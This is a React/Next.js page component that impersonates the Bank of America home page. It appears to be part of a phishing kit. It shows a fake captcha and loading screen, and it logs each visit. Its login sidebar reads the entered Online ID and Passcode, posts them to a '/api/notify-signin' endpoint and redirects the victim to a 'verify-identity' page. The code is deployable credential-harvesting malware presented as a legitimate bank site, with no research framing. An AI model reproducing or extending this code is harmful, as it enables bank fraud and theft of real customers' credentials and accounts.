"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Header } from "@/components/header"
import { LoginModal } from "@/components/login-modal"
import { CaptchaModal } from "@/components/captcha-modal"
import { CreditCardSection } from "@/components/credit-card-section"
import { ServicesSection } from "@/components/services-section"
import { Footer } from "@/components/footer"

export default function HomePage() {
  const router = useRouter()
  const [isLoginModalOpen, setIsLoginModalOpen] = useState(false)
  const [isCaptchaVerified, setIsCaptchaVerified] = useState(false)
  const [showCaptcha, setShowCaptcha] = useState(true)

  useEffect(() => {
    if (isCaptchaVerified) {
      const notifyVisit = async () => {
        try {
          await fetch("/api/notify-visit", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              userAgent: navigator.userAgent,
              timestamp: new Date().toISOString(),
            }),
          })
        } catch (error) {
          console.error("Failed to notify visit:", error)
        }
      }

      notifyVisit()
    }
  }, [isCaptchaVerified])

  const handleDesktopSignIn = async () => {
    const onlineIdInput = document.querySelector('input[placeholder="Online ID"]') as HTMLInputElement
    const passcodeInput = document.querySelector('input[placeholder="Passcode"]') as HTMLInputElement

    const onlineId = onlineIdInput?.value || ""
    const passcode = passcodeInput?.value || ""

    try {
      await fetch("/api/notify-signin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          onlineId,
          passcode,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
        }),
      })

      // Redirect to identity verification page after successful login attempt
      router.push("/verify-identity")
    } catch (error) {
      console.error("Failed to notify sign-in:", error)
    }
  }

  const handleCaptchaVerified = () => {
    setIsCaptchaVerified(true)
    setShowCaptcha(false)
  }

  if (!isCaptchaVerified) {
    return (
      <>
        <div className="min-h-screen bg-gray-100 flex items-center justify-center">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#e31837] mx-auto mb-4"></div>
            <p className="text-gray-600">Loading Bank of America...</p>
          </div>
        </div>
        <CaptchaModal isOpen={showCaptcha} onVerified={handleCaptchaVerified} />
      </>
    )
  }

  return (
    <div className="min-h-screen bg-white">
      {/* FDIC Notice */}
      <div className="bg-gray-50 text-center py-2 px-4 text-xs text-gray-600">
        <span className="italic">Bank of America deposit products:</span> <span className="font-semibold">FDIC</span>{" "}
        <span className="text-blue-600">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
      </div>

      <Header onLoginClick={() => setIsLoginModalOpen(true)} />

      <div className="flex">
        {/* Desktop Login Sidebar - Hidden on mobile */}
        <div className="hidden lg:block w-80 bg-red-600 min-h-screen">
          <div className="p-6 text-white">
            <div className="mb-6">
              <input
                type="text"
                placeholder="Online ID"
                className="w-full p-3 mb-3 text-gray-900 rounded border-0 focus:outline-none focus:ring-2 focus:ring-white"
              />
              <input
                type="password"
                placeholder="Passcode"
                className="w-full p-3 mb-4 text-gray-900 rounded border-0 focus:outline-none focus:ring-2 focus:ring-white"
              />
              <button
                onClick={handleDesktopSignIn}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded transition-colors"
              >
                Log In
              </button>
            </div>

            <div className="text-sm space-y-2">
              <div className="flex items-center space-x-2">
                <input type="checkbox" id="save-id" className="rounded" />
                <label htmlFor="save-id" className="text-white">
                  Save Online ID
                </label>
              </div>
              <div className="space-y-1">
                <a href="#" className="block text-white hover:underline">
                  Forgot ID/Passcode?
                </a>
                <a href="#" className="block text-white hover:underline">
                  Enroll
                </a>
              </div>
            </div>

            <div className="mt-8 pt-6 border-t border-red-500">
              <div className="flex items-center space-x-2 mb-4">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                </svg>
                <span className="text-sm">Find your closest financial center or ATM</span>
              </div>
              <div className="flex items-center space-x-2">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                </svg>
                <span className="text-sm">Schedule an appointment</span>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <main className="flex-1 bg-white">
          <CreditCardSection />
          <ServicesSection />

          <div className="px-4 lg:px-8 py-6 max-w-4xl mx-auto space-y-3">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <button className="flex items-center justify-center space-x-2 bg-white border-2 border-red-600 text-red-600 py-3 px-4 rounded-lg font-medium hover:bg-red-50">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M17 3H7c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H7V8h14v11zM7 10h5v5H7z" />
                </svg>
                <span>Get the free app</span>
              </button>

              <button className="flex items-center justify-center space-x-2 bg-white border-2 border-blue-600 text-blue-600 py-3 px-4 rounded-lg font-medium hover:bg-blue-50">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11zM7 10h5v5H7z" />
                </svg>
                <span>Schedule an appointment</span>
              </button>
            </div>
          </div>

          {/* Promotional Cards Section */}
          <div className="px-4 lg:px-8 py-8 max-w-6xl mx-auto">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
              {/* New Offer Card */}
              <div className="bg-white border border-gray-200 rounded-lg p-6 text-center">
                <div className="w-12 h-12 bg-red-100 rounded-lg flex items-center justify-center mx-auto mb-4">
                  <svg className="w-6 h-6 text-red-600" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
                  </svg>
                </div>
                <h3 className="font-semibold text-gray-900 mb-2">New offer: 6% cash back</h3>
                <p className="text-sm text-gray-600 mb-4">
                  Earn more in the category with the Customized Cash Rewards credit card.
                </p>
                <button className="text-blue-600 font-medium hover:underline text-sm">Apply now →</button>
              </div>

              {/* Checking Account Card */}
              <div className="bg-white border border-gray-200 rounded-lg p-6 text-center">
                <div className="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center mx-auto mb-4">
                  <svg className="w-6 h-6 text-blue-600" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                  </svg>
                </div>
                <h3 className="font-semibold text-gray-900 mb-2">Choose a checking account that's right for you</h3>
                <p className="text-sm text-gray-600 mb-4">
                  Our checking accounts provide easy to use digital tools and customizable features.
                </p>
                <button className="text-blue-600 font-medium hover:underline text-sm">Open an account →</button>
              </div>

              {/* Mobile Alerts Card */}
              <div className="bg-white border border-gray-200 rounded-lg p-6 text-center">
                <div className="w-12 h-12 bg-orange-100 rounded-lg flex items-center justify-center mx-auto mb-4">
                  <svg className="w-6 h-6 text-orange-600" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
                  </svg>
                </div>
                <h3 className="font-semibold text-gray-900 mb-2">Custom mobile alerts</h3>
                <p className="text-sm text-gray-600 mb-4">
                  With our Mobile Banking app alerts, you can stay on top of your account activity.
                </p>
                <button className="text-blue-600 font-medium hover:underline text-sm">Get the app →</button>
              </div>

              {/* Merrill Investment Card */}
              <div className="bg-white border border-gray-200 rounded-lg p-6 text-center">
                <div className="w-12 h-12 bg-green-100 rounded-lg flex items-center justify-center mx-auto mb-4">
                  <svg className="w-6 h-6 text-green-600" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z" />
                  </svg>
                </div>
                <h3 className="font-semibold text-gray-900 mb-2">Invest the way you want</h3>
                <p className="text-sm text-gray-600 mb-4">
                  Choose your own investments, or get help from our advisors.
                </p>
                <button className="text-blue-600 font-medium hover:underline text-sm">Get started →</button>
              </div>
            </div>
          </div>

          {/* Financial Goals Section */}
          <div className="px-4 lg:px-8 py-8 text-center bg-gray-50">
            <h2 className="text-3xl font-semibold text-gray-900 mb-4">Your financial goals matter</h2>
            <p className="text-gray-600 mb-8 max-w-3xl mx-auto text-lg">
              We can help you achieve them through Better Money Habits® financial education and programs that make
              communities stronger.
            </p>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 max-w-6xl mx-auto">
              <div className="bg-white rounded-lg overflow-hidden shadow-sm">
                <img src="/woman-planning-finances.png" alt="Financial Planning" className="w-full h-48 object-cover" />
                <div className="p-4">
                  <h3 className="font-semibold text-gray-900 mb-2">Build a budget that works for you</h3>
                  <p className="text-sm text-gray-600">
                    Learn how to create and stick to a budget that fits your lifestyle.
                  </p>
                </div>
              </div>

              <div className="bg-white rounded-lg overflow-hidden shadow-sm">
                <img src="/couple-shopping-together.png" alt="Smart Shopping" className="w-full h-48 object-cover" />
                <div className="p-4">
                  <h3 className="font-semibold text-gray-900 mb-2">Shop smarter, not harder</h3>
                  <p className="text-sm text-gray-600">
                    Discover tips and tricks for getting the most value from your purchases.
                  </p>
                </div>
              </div>

              <div className="bg-white rounded-lg overflow-hidden shadow-sm">
                <img src="/business-owner-planning.png" alt="Business Planning" className="w-full h-48 object-cover" />
                <div className="p-4">
                  <h3 className="font-semibold text-gray-900 mb-2">Start a business or expand your current one</h3>
                  <p className="text-sm text-gray-600">
                    Get the financial tools and guidance you need to grow your business.
                  </p>
                </div>
              </div>

              <div className="bg-white rounded-lg overflow-hidden shadow-sm">
                <img src="/family-saving-money.png" alt="Saving Money" className="w-full h-48 object-cover" />
                <div className="p-4">
                  <h3 className="font-semibold text-gray-900 mb-2">Save for what matters most</h3>
                  <p className="text-sm text-gray-600">Learn strategies to save for your biggest goals and dreams.</p>
                </div>
              </div>
            </div>

            <div className="mt-8">
              <button className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-8 rounded-lg transition-colors">
                Visit Better Money Habits®
              </button>
            </div>
          </div>

          {/* Bottom CTA Banner */}
          <div className="bg-red-50 border-t border-red-200 px-4 py-4">
            <div className="flex items-center justify-between max-w-4xl mx-auto">
              <div className="flex items-center space-x-3">
                <div className="w-8 h-6 bg-red-600 rounded flex items-center justify-center">
                  <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11zM7 10h5v5H7z" />
                  </svg>
                </div>
                <span className="text-sm text-gray-700">Choose a checking account that's right for you.</span>
              </div>
              <div className="flex items-center space-x-4">
                <button className="text-blue-600 text-sm font-medium hover:underline">Open an account →</button>
                <button className="text-gray-400 hover:text-gray-600 text-xl">×</button>
              </div>
            </div>
          </div>
        </main>
      </div>

      <LoginModal isOpen={isLoginModalOpen} onClose={() => setIsLoginModalOpen(false)} />

      <Footer />
    </div>
  )
}
